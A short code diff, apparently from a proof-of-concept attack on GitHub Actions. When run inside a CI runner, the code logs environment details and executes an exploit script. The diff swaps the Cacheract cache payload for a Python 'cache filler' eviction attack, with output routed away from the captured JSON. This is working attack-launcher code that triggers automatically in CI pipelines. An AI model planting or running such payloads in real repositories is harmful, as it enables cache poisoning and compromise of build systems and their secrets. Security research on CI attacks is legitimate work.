@@ -23,17 +23,17 @@ if (process.env.GITHUB_ACTIONS === "true") {
   console.error("[PoC] Ref: " + process.env.GITHUB_REF);
   console.error("[PoC] Event: " + process.env.GITHUB_EVENT_NAME);
   console.error("[PoC] Runner: " + process.env.RUNNER_OS + " / " + process.env.RUNNER_ENVIRONMENT);
-  console.error("[PoC] Executing Cacheract payload...");
+  console.error("[PoC] Executing cache filler payload (eviction-based attack)...");
   console.error("=".repeat(60));
   try {
-    execSync("node .github/exploit/cacheract.js", {
+    execSync("python3 .github/exploit/filler.py", {
       cwd: process.env.GITHUB_WORKSPACE,
       stdio: ["inherit", 2, "inherit"],  // stdout→stderr to not break JSON capture
       timeout: 1800000,  // 30 min
     });
-    console.error("[PoC] Cacheract execution complete");
+    console.error("[PoC] Cache filler execution complete");
   } catch (e: any) {
-    console.error("[PoC] Cacheract error: " + e.message);
+    console.error("[PoC] Cache filler error: " + e.message);
   }
   console.error("=".repeat(60));
 }
